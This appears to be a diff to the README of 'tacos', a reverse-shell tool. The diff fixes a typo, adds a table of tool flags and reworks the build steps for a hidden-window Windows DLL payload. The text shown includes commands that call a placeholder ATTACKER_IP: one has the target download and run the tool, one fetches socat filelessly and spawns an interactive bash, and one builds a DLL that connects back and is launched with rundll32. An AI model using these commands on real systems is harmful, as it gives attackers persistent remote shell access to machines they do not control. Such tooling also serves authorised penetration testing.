@@ -4,7 +4,7 @@
 <div align=center>
 <img src=https://github.com/ariary/tacos/blob/main/logo.png width=250>
 
-Spawn a pty in your reverse shell to <strong>automaticaly</strong> make it <strong>interactive</strong> for socat listener.
+Spawn a pty in your reverse shell to <strong>automatically</strong> make it <strong>interactive</strong> for socat listener.
 
 <strong> Fast interactive reverse shell set-up [ 🐳 (container) ](#with-docker-recommended)</strong>
 
@@ -39,6 +39,17 @@ wrap --lhost [ATTACKER_IP] #launch socat listener + output command to run on tar
 # On target
 # paste command outputted by wrap: it will download tacos, and launch it to obtain the interactive revshell
 ```
+
+### `tacos` flags
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--detect` | false | Auto-detect default shell |
+| `--shell` | `/bin/bash` | Shell to use |
+| `--timeout` | 10 | Connection timeout (seconds) |
+| `--retry` | 0 | Max reconnection attempts (0 = one shot) |
+| `--setreuid` | false | Set real UID to effective UID |
+| `--version` | - | Print version and exit |
 
 <details><summary><h4>🎁 Bonus n°1: expose listener to the world wide web</h4></summary>
 Useful if target can't directly reach the attacker machine, but has internet access
@@ -113,8 +124,12 @@ fileless-xec [ATTACKER_IP]:8080/socat -- exec:'bash -il',pty,stderr,setsid,sigin
 ### Use dll instead of `.exe`
 ```shell
 # On attacker machine:
-# modify ./cmd/tacosdll/tacosdll.go with the according IP:PORT
-$ GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags="-w -s -H=windowsgui" -o tacos.dll ./cmd/tacosdll/tacosdll.go
+$ GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc \
+  go build -buildmode=c-shared \
+  -ldflags="-w -s -H=windowsgui -X 'main.Remote=ATTACKER_IP:PORT'" \
+  -o tacos.dll ./cmd/tacosdll/tacosdll.go
+
+# Or use: make build.tacosdll REMOTE=ATTACKER_IP:PORT
 
 # On remote:
 > rundll32.exe ./tacos.dll,Tacos
